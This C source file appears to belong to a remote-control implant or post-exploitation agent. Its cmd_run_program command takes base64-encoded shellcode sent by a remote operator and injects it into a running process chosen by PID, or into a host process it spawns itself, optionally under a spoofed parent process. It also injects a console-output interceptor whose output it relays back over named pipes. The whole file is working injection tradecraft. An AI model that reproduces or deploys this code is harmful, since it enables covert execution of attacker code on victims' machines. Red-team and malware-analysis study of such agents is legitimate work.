#include <process.h>
#include <string.h>
#include "agent_session.h"
#include "agent_protocol.h"
#include "cJSON.h"
#include "agent_utility.h"
#include "agent_config.h"
#include "agent_process.h"
#include "agent_named_pipe.h"
#include "agent_thread.h"
#include "agent_event.h"
#include "agent_commands.h"
#include "agent_session.h"

static uint32_t handle_client_output_thread(void* args) {
	program_run_info* info = (program_run_info*)args;
	process_intercepted* proc = info->process_intercepted;

	char* payload = ZERO(char);
	DECLARE_RESULT_WITH_FEEDBACK(result);
	result->error_code = ERROR_OK;

	if (!proc->pipe->is_client && !pipe_server_connect(proc->pipe, 0x4000)) {
		result->error_code = ERROR_PIPE_SERVER_CONNECT;
		goto exit;
	}

	bool process_terminated = false;
	while (true) {
		uint8_t buf[4096] = { 0 };
		int nread = pipe_read(proc->pipe, sizeof buf, buf);
		if (nread > 0) {
			char* normalized_text = normalize_text(buf, nread);
			if (normalized_text) {
				message_send_data_partial(info->sess, info->pck, strlen(normalized_text), (uint8_t*)normalized_text);
				FREE(normalized_text);
			}
			else 
				message_send_data_partial(info->sess, info->pck, nread, buf);
		}			
		else if (!process_terminated) {
			process_terminated = verify_program_termination(proc);
			// wait some more seconds to give enough time to collect all the output
			if (process_terminated) sleep_ms(3000);
		}						
		else 
			break;		
	}

exit:
	// send completation message
	payload = serialize_command_result(result);
	if (payload) message_send_command_result(info->sess, info->pck, payload);
	FREE(payload);
	program_run_info_free(info);
	return result->error_code;
}

static process_handle* run_host_process(session* sess, bool is_32_bit, uint32_t* error_code) {
	process_handle* process = ZERO(process_handle);

	cJSON* jsession = cJSON_GetObjectItem(sess->config, CONFIG_SESSION);
	if (!jsession) goto exit;

	cJSON* jexec = cJSON_GetObjectItem(jsession, CONFIG_SESSION_EXEC);
	if (!jexec) goto exit;

	char* parent_program = ZERO(char);
	cJSON* jProcessParent = cJSON_GetObjectItemCaseSensitive(jexec, CONFIG_SESSION_PROCESSPARENT);
	if (jProcessParent)
		parent_program = jProcessParent->valuestring;

	cJSON* jhost_processes = cJSON_GetObjectItem(jexec, CONFIG_SESSION_EXEC_HOSTPROCESS);
	if (!jhost_processes) goto exit;	

	if (is_32_bit) {
		jhost_processes = cJSON_GetObjectItem(jhost_processes, CONFIG_SESSION_EXEC_HOSTPROCESS_X86);
		if (!jhost_processes) goto exit;
	}
	else {
		jhost_processes = cJSON_GetObjectItem(jhost_processes, CONFIG_SESSION_EXEC_HOSTPROCESS_X64);
		if (!jhost_processes) goto exit;
	}

	// try to run all programs in list, stopping at the first success
	cJSON* jhost_process = ZERO(cJSON);
	cJSON_ArrayForEach(jhost_process, jhost_processes) {
		uint32_t index = 0;
		char* program = jhost_process->valuestring;
		process = OBJ_ALLOC(process_handle);
		if (!process) goto exit;
		if (SUCCESS(process_run(ZERO(char), program, parent_program, process))) break;
		FREE(process);
		if (error_code) *error_code = get_OS_error();
	}

exit:
	return process;
}

static void clean_dead_intercepted_processes(session* sess) {
	process_intercepted* prev = sess->intercepted_processes;
	process_intercepted* cur = sess->intercepted_processes;
	process_intercepted* p = ZERO(process_intercepted);

	while (cur) {
		if (!process_is_alive_by_pid(cur->process_pid)) {
			// detach node
			if (prev == cur) {
				// is first node? if so, move the head
				sess->intercepted_processes = cur->next;
				prev = sess->intercepted_processes;
			}
			else {
				prev->next = cur->next;
			}
			
			p = cur;
			cur = cur->next;
			process_intercepted_free(p);
		}
		else {
			prev = cur;
			cur = cur->next;
		}
	}
}

static void add_intercepted_process(session* sess, process_intercepted* proc) {
	process_intercepted* cur = sess->intercepted_processes;

	if (!cur) {
		sess->intercepted_processes = proc;
	}
	else {
		while (cur->next)
			cur = cur->next;
		cur->next = proc;
	}
}

static process_intercepted* get_intercepted_process(session* sess, uint32_t pid) {
	process_intercepted* result = ZERO(process_intercepted);	
	process_intercepted* proc = sess->intercepted_processes;
	if (!pid || !process_is_alive_by_pid(pid)) return result;

	while (proc) {
		if (proc->process_pid == pid) {
			result = proc;
			break;
		}
		proc = proc->next;
	}
	
	return result;
}

command_result* cmd_run_program(session* sess, packet* pck) {
	DECLARE_RESULT(error);
	thread_handle* thread_interceptor = ZERO(thread_handle);
	thread_handle* thread_send_output = ZERO(thread_handle);
	size_t interceptor_shellcode_len = 0;
	size_t program_shellcode_len = 0;
	uint8_t* interceptor_shellcode = ZERO(uint8_t);
	uint8_t* program_shellcode = ZERO(uint8_t);
	char* program_arguments = ZERO(char);	
	pipe_handle* pipe = ZERO(pipe_handle);
	program_run_info* info = ZERO(program_run_info);
	process_handle* host_process = ZERO(process_handle);
	process_intercepted* proc_intercepted = ZERO(process_intercepted);
	char pipe_name[64] = "//./pipe/";

	thread_interceptor = OBJ_ALLOC(thread_handle);
	if (!thread_interceptor) goto fail;

	// get info
	cJSON* jpck = convert_to_JSON(pck);
	if (!jpck) goto fail;
	cJSON* jpid = cJSON_GetObjectItem(jpck, RUN_PID);
	cJSON* jshellcode_interceptor = cJSON_GetObjectItem(jpck, RUN_INTERCEPTOR);
	cJSON* jshellcode_program = cJSON_GetObjectItem(jpck, RUN_MAIN);
	cJSON* jbitness = cJSON_GetObjectItem(jpck, RUN_BITNESS);
	cJSON* jbackground = cJSON_GetObjectItem(jpck, EXEC_RUN_BACKGROUND);
	if (!jbackground || !jshellcode_interceptor || !jpid || !jshellcode_program || !jbitness) goto fail;

	proc_intercepted = get_intercepted_process(sess, jpid->valueint);
	if (!proc_intercepted) {
		// I need to setup the environment first
		info = OBJ_ALLOC(program_run_info);
		proc_intercepted = OBJ_ALLOC(process_intercepted);
		if (!info || !proc_intercepted) goto fail;

		// populate the info object. The packet is cloned since it is freed
		// by the framework when the command return. As general rule, long 
		// running command should always clone the packet
		if (!jbackground->valueint) {
			info->sess = sess;
			info->pck = message_clone_packet(pck);
			info->process_intercepted = proc_intercepted;
		}

		if (!jpid->valueint) {
			// if no pid is specified run one of the default host processes
			uint32_t error_code = 0;
			bool is_32_bit = !strcmp(jbitness->valuestring, "x86");
			host_process = run_host_process(sess, is_32_bit, &error_code);
			if (!host_process) {
				set_OS_error(error_code);
				error->error_code = ERROR_PROCESS_CREATION;
				goto fail;
			}

			// populate intercepted process
			proc_intercepted->process_pid = host_process->pid;

			// create thread that read the output if not executed in background
			if (!jbackground->valueint) {
				proc_intercepted->pipe = pipe_from_handle(host_process->proc_stdout, true);				
				session_start_thread(handle_client_output_thread, (void*)info, sess);
			}			

			process_free(host_process, false);
		}
		else  {
			// sanity check, do not inject to myself or to dead process
			if (jpid->valueint == _getpid() || !process_is_alive_by_pid(jpid->valueint)) goto fail;

			// check if I have to read the output from an injected process.
			// If so the output interceptord DLL must be injected too (not necessary 
			// if the process is created from the agent)
			if (!jbackground->valueint) {
				// create named pipe with the input ID
				uint32_t seed = system_fingerprint() + jpid->valueint;
				gen_random_string(seed, 32, &pipe_name[strlen(pipe_name)]);

				// create the pipe server to receive console output
				proc_intercepted->process_pid = jpid->valueint;
				proc_intercepted->pipe = pipe_server_new(pipe_name, 0x4000, true, false);
				if (!proc_intercepted->pipe) goto fail;

				// create event to stop interceptor
				uint32_t termination_seed = system_fingerprint() + (jpid->valueint * 3);
				char termination_event_name[64] = "Global\\";
				gen_random_string(termination_seed, 32, &termination_event_name[strlen(termination_event_name)]);
				proc_intercepted->interceptor_event = event_new(termination_event_name);
				if (!proc_intercepted->interceptor_event) goto fail;

				// decode the console output interceptor shellcode
				interceptor_shellcode = base64_decode(jshellcode_interceptor->valuestring, &interceptor_shellcode_len);
				if (!interceptor_shellcode) {
					error->error_code = ERROR_BASE64_DECODE;
					goto fail;
				}

				// create an event to be signaled when the interceptor is correctly initialized
				uint32_t initialization_seed = system_fingerprint() + (jpid->valueint * 2);
				char initialization_event_name[64] = "Global\\";
				gen_random_string(initialization_seed, 32, &initialization_event_name[strlen(initialization_event_name)]);
				event_handle* initialization_event = event_new(initialization_event_name);
				if (!initialization_event) goto fail;

				// finally inject the console output interceptor
				error->error_code =
					process_inject_shellcode(
						proc_intercepted->process_pid,
						interceptor_shellcode_len,
						(uint8_t*)interceptor_shellcode,
						thread_interceptor
					);

				if (!thread_interceptor) goto fail;

				// add the remote thread created to intercept the output in the injected process
				if (!session_add_thread(thread_interceptor, sess)) goto fail;

				// create thread that read the output from the interceptor
				session_start_thread(handle_client_output_thread, (void*)info, sess);

				// wait for event set to be sure the interceptor initializated correctly			
				bool is_signaled = event_wait(initialization_event, 10000);
				event_free(initialization_event);
				if (!is_signaled) {
					error->error_code = ERROR_INTERCEPTOR_NOT_CONNECTED;
					goto fail;
				}
			}
		}		
	}

	// decode program shellcode
	program_shellcode = base64_decode(jshellcode_program->valuestring, &program_shellcode_len);
	if (!program_shellcode) {
		error->error_code = ERROR_BASE64_DECODE;
		goto fail;
	}	
			
	// now I can inject the program shellcode	
	error->error_code = 
		process_inject_shellcode(
			proc_intercepted->process_pid, 
			program_shellcode_len, 
			(uint8_t*)program_shellcode, 
			0
		);
	if (!SUCCESS(error->error_code)) goto fail;
		
	add_intercepted_process(sess, proc_intercepted);
	SET_RESULT_SUCCESS(error);	
	goto exit;
	
fail:	
	error->data = (void*)get_OS_error_as_string();
	program_run_info_free(info);

exit:
	if (jpck) cJSON_Delete(jpck);
	clean_dead_intercepted_processes(sess);
	FREE(interceptor_shellcode);
	FREE(program_shellcode);
	return error;
}